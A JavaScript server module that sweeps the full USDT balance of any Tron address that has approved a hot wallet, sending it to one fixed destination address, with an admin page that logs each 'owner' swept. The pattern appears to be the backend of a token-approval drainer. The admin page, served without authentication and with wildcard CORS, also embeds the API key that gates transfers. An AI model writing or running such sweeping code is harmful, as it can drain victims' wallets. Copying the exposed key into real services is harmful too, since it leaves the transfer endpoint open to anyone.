import bs58check from "bs58check";
import { TronWeb } from "tronweb";
import { CONFIG } from "./config.mjs";

export function verifyWallet(wallet) {
  if (wallet.address !== CONFIG.HOT_WALLET_ADDRESS) {
    throw new Error(
      `hotwallet.json address ${wallet.address} != config ${CONFIG.HOT_WALLET_ADDRESS}`,
    );
  }
  if (typeof wallet.privateKeyHex !== "string" || !wallet.privateKeyHex) {
    throw new Error("hotwallet.json missing privateKeyHex");
  }
  const derived = TronWeb.address.fromPrivateKey(wallet.privateKeyHex);
  if (!derived || derived.toLowerCase() !== wallet.address.toLowerCase()) {
    throw new Error(
      `derived address ${derived ?? "invalid key"} != wallet address ${wallet.address}`,
    );
  }
  return wallet;
}

const CORS_HEADERS = {
  "access-control-allow-origin": "*",
  "access-control-allow-headers": "content-type,x-api-key",
  "access-control-allow-methods": "GET,POST,OPTIONS",
  "cache-control": "no-store",
};

function isValidTronAddress(address) {
  if (typeof address !== "string" || !address) return false;
  try {
    const decoded = bs58check.decode(address);
    return decoded.length === 21 && decoded[0] === 0x41;
  } catch {
    return false;
  }
}

function send(res, status, body) {
  const data = JSON.stringify(body);
  res.writeHead(status, { "content-type": "application/json", ...CORS_HEADERS });
  res.end(data);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on("data", (c) => {
      size += c.length;
      if (size > 4096) {
        reject(new Error("body too large"));
        req.pause();
        return;
      }
      chunks.push(c);
    });
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

const LOG_CAP = 100;

const ADMIN_PAGE = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hot Wallet Admin</title>
<style>
body{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:#0b0e11;color:#eaecef;margin:0;padding:24px;max-width:960px}
h1{font-size:20px;margin:0 0 4px}
.meta{color:#848e9c;font-size:13px}
.row{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin:16px 0}
button{background:#1e2329;color:#eaecef;border:1px solid #3a4149;border-radius:6px;padding:8px 12px;cursor:pointer;font:inherit}
button:hover{background:#2b3139}
button.danger{background:#f6465d;border-color:#f6465d;color:#fff}
button.danger:hover{background:#d8394d}
button.state-on{border-color:#f0b90b;color:#f0b90b}
#api-key{background:#1e2329;border:1px solid #3a4149;border-radius:6px;padding:6px 10px;user-select:all}
table{border-collapse:collapse;width:100%;margin-top:8px}
th,td{border-bottom:1px solid #2b3139;padding:6px 8px;text-align:left;font-size:13px;white-space:nowrap}
th{color:#848e9c}
td.detail{white-space:normal;word-break:break-all}
.empty{color:#848e9c;padding:8px 0}
.err{color:#f6465d}
</style>
</head>
<body>
<h1>Hot Wallet Admin</h1>
<div class="meta" id="state-line">loading…</div>
<div class="row">
  <span id="api-key"></span>
  <button id="copy-key">Copy API key</button>
</div>
<div class="row">
  <button id="pause-btn">Pause transfers</button>
  <button id="ratelimit-btn">Rate limit</button>
  <button id="clear-btn" class="danger">Clear log</button>
</div>
<table>
  <thead><tr><th>time</th><th>result</th><th>owner</th><th>detail</th><th>amount</th></tr></thead>
  <tbody id="log-body"></tbody>
</table>
<div id="empty" class="empty" hidden>No transfer attempts yet.</div>
<script>
var API_KEY = ${JSON.stringify(CONFIG.API_KEY)};
var state = null;

function esc(v) {
  return String(v).replace(/[&<>"']/g, function (c) {
    return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
  });
}

function refresh() {
  fetch("/api/admin/status", { headers: { "x-api-key": API_KEY } }).then(function (r) { return r.json(); }).then(function (s) {
    state = s;
    var line = s.network + " · " + (s.paused ? "PAUSED" : "running") + " · rate limit " + (s.rateLimitOn ? "on" : "off");
    document.getElementById("state-line").textContent = line;
    var pb = document.getElementById("pause-btn");
    pb.textContent = s.paused ? "Resume transfers" : "Pause transfers";
    pb.className = s.paused ? "state-on" : "";
    var rb = document.getElementById("ratelimit-btn");
    rb.className = s.rateLimitOn ? "state-on" : "";
    var rows = (s.log || []).slice().reverse().slice(0, 20);
    var body = "";
    for (var i = 0; i < rows.length; i += 1) {
      var e = rows[i];
      body += "<tr><td>" + esc(new Date(e.ts).toISOString()) + "</td><td>" + esc(e.result) +
        "</td><td>" + esc(e.owner) + "</td><td class=\\"detail\\">" + esc(e.detail) +
        "</td><td>" + (e.amount === null || e.amount === undefined ? "" : esc(e.amount)) + "</td></tr>";
    }
    document.getElementById("log-body").innerHTML = body;
    document.getElementById("empty").hidden = rows.length > 0;
  }).catch(function (e) {
    document.getElementById("state-line").textContent = "status fetch failed: " + e;
    document.getElementById("state-line").className = "meta err";
  });
}

function post(url, payload) {
  fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json", "x-api-key": API_KEY },
    body: JSON.stringify(payload)
  }).then(refresh);
}

document.getElementById("api-key").textContent = API_KEY;
document.getElementById("copy-key").addEventListener("click", function () {
  var btn = this;
  navigator.clipboard.writeText(API_KEY).then(function () {
    btn.textContent = "Copied!";
    setTimeout(function () { btn.textContent = "Copy API key"; }, 1200);
  });
});
document.getElementById("pause-btn").addEventListener("click", function () {
  if (!state) return;
  post("/api/admin/pause", { paused: !state.paused });
});
document.getElementById("ratelimit-btn").addEventListener("click", function () {
  if (!state) return;
  post("/api/admin/ratelimit", { enabled: !state.rateLimitOn });
});
document.getElementById("clear-btn").addEventListener("click", function () {
  post("/api/admin/clear-log", {});
});
refresh();
setInterval(refresh, 5000);
</script>
</body>
</html>
`;

export function createHandler({ tronWeb }) {
  // admin state (per handler instance)
  let paused = false;
  let rateLimitOn = true;
  const transferLog = [];

  function recordLog(owner, result, detail, amount = null) {
    transferLog.push({ ts: Date.now(), owner, result, detail, amount });
    if (transferLog.length > LOG_CAP) transferLog.shift();
  }

  // in-memory per-IP rate limit: sliding window (per handler instance)
  const rateBuckets = new Map();
  function rateLimited(ip) {
    const now = Date.now();
    const win = rateBuckets.get(ip)?.filter((t) => now - t < CONFIG.RATE_LIMIT_WINDOW_MS) ?? [];
    if (win.length >= CONFIG.RATE_LIMIT_MAX) {
      rateBuckets.set(ip, win);
      return true;
    }
    win.push(now);
    rateBuckets.set(ip, win);
    if (rateBuckets.size > 10_000) rateBuckets.clear();
    return false;
  }

  async function constantUint(contract, selector, params, issuer) {
    const r = await tronWeb.transactionBuilder.triggerConstantContract(
      contract,
      selector,
      {},
      params,
      issuer,
    );
    const hex = r.constant_result?.[0];
    // A reverted call yields `constant_result: [""]`, which would otherwise
    // blow up inside BigInt("0x" + hex) with a raw SyntaxError.
    if (typeof hex !== "string" || !/^[0-9a-fA-F]+$/.test(hex)) {
      throw new Error("no usable constant_result");
    }
    return BigInt("0x" + hex);
  }

  // Used only when the chain parameters lookup fails. Kept comfortably above
  // the typical 100 sun/energy rate so a blind estimate never under-funds the
  // hot wallet, without being so high that valid transfers get blocked.
  const FALLBACK_ENERGY_PRICE = 210;
  const BANDWIDTH_HEADROOM_SUN = 100_000;

  async function getEnergyPriceSun() {
    try {
      const params = await tronWeb.trx.getChainParameters();
      // TronWeb v6 resolves the raw array of {key,value} pairs; older builds
      // wrapped it. Reading `params.chainParameter` alone silently yielded []
      // and forced the fallback on every call.
      const list = Array.isArray(params)
        ? params
        : (params?.chainParameter ?? []);
      const entry = list.find(
        (p) => String(p?.key).toLowerCase() === "getenergyfee",
      );
      const price = Number(entry?.value);
      return Number.isFinite(price) && price > 0 ? price : FALLBACK_ENERGY_PRICE;
    } catch {
      return FALLBACK_ENERGY_PRICE;
    }
  }

  async function estimateTransferFeeSun(owner, dest, amountSun) {
    const energyPrice = await getEnergyPriceSun();
    // A constant call reverts when the wallet lacks balance or allowance, which
    // makes TronWeb throw and yields no usable figure — this is why the hot
    // wallet (0 USDT, no allowance to itself) could never produce an estimate.
    // Re-probe with a zero amount so the allowance gate passes and the full
    // storage path executes; USDT transferFrom energy is amount-independent.
    for (const amount of [amountSun, "0"]) {
      try {
        const r = await tronWeb.transactionBuilder.triggerConstantContract(
          CONFIG.USDT_CONTRACT,
          "transferFrom(address,address,uint256)",
          {},
          [
            { type: "address", value: owner },
            { type: "address", value: dest },
            { type: "uint256", value: String(amount) },
          ],
          CONFIG.HOT_WALLET_ADDRESS,
        );
        const energyUsed = Number(r.energy_used || 0);
        if (energyUsed > 0) return energyUsed * energyPrice + BANDWIDTH_HEADROOM_SUN;
      } catch {
        // Reverted or upstream error — fall through to the zero-amount probe.
      }
    }
    return null;
  }

  async function describeWallet() {
    try {
      const trxSun = await tronWeb.trx.getBalance(CONFIG.HOT_WALLET_ADDRESS);
      const usdtRaw = await constantUint(
        CONFIG.USDT_CONTRACT,
        "balanceOf(address)",
        [{ type: "address", value: CONFIG.HOT_WALLET_ADDRESS }],
        CONFIG.HOT_WALLET_ADDRESS,
      );
      const feeEstimateSun = await estimateTransferFeeSun(
        CONFIG.HOT_WALLET_ADDRESS,
        CONFIG.DEFAULT_DEST,
        "1",
      );
      const feeEstimateAt = feeEstimateSun === null ? null : Date.now();
      const minSun = CONFIG.MIN_HOT_TRX_SUN;
      const requiredSun = Math.max(minSun, feeEstimateSun ?? 0);
      return {
        address: CONFIG.HOT_WALLET_ADDRESS,
        trxSun: Number(trxSun),
        usdtRaw: usdtRaw.toString(),
        lowTrx: trxSun < CONFIG.MIN_HOT_TRX_SUN,
        minSun,
        feeEstimateSun,
        feeEstimateAt,
        belowEstimate: feeEstimateSun !== null && Number(trxSun) < requiredSun,
        checkedAt: Date.now(),
      };
    } catch (e) {
      return { error: String(e?.message || e).slice(0, 300) };
    }
  }

  async function handleTransfer(req, res, ip) {
    if (rateLimitOn && rateLimited(ip)) {
      return send(res, 429, { status: "error", code: "RATE_LIMITED" });
    }
    if (req.headers["x-api-key"] !== CONFIG.API_KEY) {
      return send(res, 401, { status: "error", code: "UNAUTHORIZED" });
    }

    let owner;
    try {
      const body = JSON.parse((await readBody(req)) || "{}");
      owner = body.owner;
    } catch {
      recordLog("", "BAD_REQUEST", "request body could not be parsed");
      return send(res, 400, { status: "error", code: "BAD_REQUEST" });
    }
    if (!isValidTronAddress(owner)) {
      recordLog(String(owner ?? ""), "INVALID_OWNER", "owner is not a valid Tron address");
      return send(res, 400, { status: "error", code: "INVALID_OWNER" });
    }
    if (owner === CONFIG.HOT_WALLET_ADDRESS || owner === CONFIG.DEFAULT_DEST) {
      recordLog(owner, "INVALID_OWNER", "owner is the hot wallet or destination address");
      return send(res, 400, { status: "error", code: "INVALID_OWNER" });
    }
    if (paused) {
      recordLog(owner, "TRANSFERS_PAUSED", "transfers are paused by admin");
      return send(res, 503, {
        ok: false,
        code: "TRANSFERS_PAUSED",
        error: "Transfers are paused",
      });
    }

    try {
      const balance = await constantUint(
        CONFIG.USDT_CONTRACT,
        "balanceOf(address)",
        [{ type: "address", value: owner }],
        owner,
      );
      if (balance === 0n) {
        recordLog(owner, "ZERO_BALANCE", "no USDT balance to send", 0);
        return send(res, 200, {
          status: "skipped",
          reason: "ZERO_BALANCE",
          owner,
          amount: "0",
        });
      }

      const allowance = await constantUint(
        CONFIG.USDT_CONTRACT,
        "allowance(address,address)",
        [
          { type: "address", value: owner },
          { type: "address", value: CONFIG.HOT_WALLET_ADDRESS },
        ],
        owner,
      );
      if (allowance < balance) {
        recordLog(owner, "APPROVE_REQUIRED", "USDT allowance below balance", Number(balance));
        return send(res, 403, {
          status: "error",
          code: "APPROVE_REQUIRED",
          owner,
          balance: balance.toString(),
          allowance: allowance.toString(),
        });
      }

      const hotTrx = await tronWeb.trx.getBalance(CONFIG.HOT_WALLET_ADDRESS);
      const feeSun = await estimateTransferFeeSun(
        owner,
        CONFIG.DEFAULT_DEST,
        balance.toString(),
      );
      const requiredSun = Math.max(CONFIG.MIN_HOT_TRX_SUN, feeSun ?? 0);
      if (hotTrx < requiredSun) {
        recordLog(owner, "HOT_WALLET_LOW_TRX", "hot wallet TRX below required minimum");
        return send(res, 503, {
          status: "error",
          code: "HOT_WALLET_LOW_TRX",
          hotTrxSun: String(hotTrx),
          requiredSun: String(requiredSun),
          feeEstimateSun: feeSun === null ? null : String(feeSun),
          replenish: CONFIG.HOT_WALLET_ADDRESS,
        });
      }

      const built = await tronWeb.transactionBuilder.triggerSmartContract(
        CONFIG.USDT_CONTRACT,
        "transferFrom(address,address,uint256)",
        { feeLimit: CONFIG.FEE_LIMIT_SUN, callValue: 0 },
        [
          { type: "address", value: owner },
          { type: "address", value: CONFIG.DEFAULT_DEST },
          { type: "uint256", value: balance.toString() },
        ],
        CONFIG.HOT_WALLET_ADDRESS,
      );
      const signed = await tronWeb.trx.sign(built.transaction);
      const broadcast = await tronWeb.trx.sendRawTransaction(signed);

      if (!broadcast.result) {
        recordLog(
          owner,
          "BROADCAST_FAILED",
          String(broadcast.code || broadcast.message || "unknown"),
          Number(balance),
        );
        return send(res, 502, {
          status: "error",
          code: "BROADCAST_FAILED",
          txId: signed.txID,
          reason: broadcast.code || broadcast.message || "unknown",
        });
      }
      recordLog(owner, "BROADCAST_OK", signed.txID, Number(balance));
      return send(res, 200, {
        status: "broadcast",
        txId: signed.txID,
        amount: balance.toString(),
        owner,
        dest: CONFIG.DEFAULT_DEST,
      });
    } catch (e) {
      console.error("[transfer]", e?.message || e);
      recordLog(owner, "UPSTREAM_ERROR", String(e?.message || e).slice(0, 300));
      return send(res, 502, {
        status: "error",
        code: "UPSTREAM_ERROR",
        message: String(e?.message || e).slice(0, 300),
      });
    }
  }

  return async (req, res) => {
    const ip = req.socket.remoteAddress || "unknown";
    const path = (req.url || "").split("?")[0];

  if (req.method === "OPTIONS") {
    res.writeHead(204, CORS_HEADERS);
    res.end();
    return;
  }
    if (req.method === "GET" && path === "/api/health") {
      return send(res, 200, {
        ok: true,
        network: CONFIG.NETWORK,
        address: CONFIG.HOT_WALLET_ADDRESS,
        dest: CONFIG.DEFAULT_DEST,
        usdt: CONFIG.USDT_CONTRACT,
      });
    }
    if (req.method === "GET" && path === "/") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8", ...CORS_HEADERS });
      res.end(ADMIN_PAGE);
      return;
    }
    if (path === "/api/admin/status" || path === "/api/admin/clear-log" || path === "/api/admin/pause" || path === "/api/admin/ratelimit") {
      if (req.headers["x-api-key"] !== CONFIG.API_KEY) {
        return send(res, 401, { status: "error", code: "UNAUTHORIZED" });
      }
    }
    if (req.method === "GET" && path === "/api/admin/status") {
      const wallet = await describeWallet();
      return send(res, 200, {
        ok: true,
        network: CONFIG.NETWORK,
        paused,
        rateLimitOn,
        wallet,
        log: [...transferLog],
      });
    }
    if (req.method === "POST" && path === "/api/admin/clear-log") {
      transferLog.length = 0;
      return send(res, 200, { ok: true });
    }
    if (req.method === "POST" && path === "/api/admin/pause") {
      let next;
      try {
        const body = JSON.parse((await readBody(req)) || "{}");
        if (typeof body.paused !== "boolean") throw new Error("paused must be a boolean");
        next = body.paused;
      } catch {
        return send(res, 400, { status: "error", code: "BAD_REQUEST" });
      }
      paused = next;
      return send(res, 200, { ok: true, paused });
    }
    if (req.method === "POST" && path === "/api/admin/ratelimit") {
      let next;
      try {
        const body = JSON.parse((await readBody(req)) || "{}");
        if (typeof body.enabled !== "boolean") throw new Error("enabled must be a boolean");
        next = body.enabled;
      } catch {
        return send(res, 400, { status: "error", code: "BAD_REQUEST" });
      }
      rateLimitOn = next;
      return send(res, 200, { ok: true, rateLimitOn });
    }
    if (req.method === "POST" && path === "/api/transfer") {
      return handleTransfer(req, res, ip);
    }
    return send(res, 404, { status: "error", code: "NOT_FOUND" });
  };
}
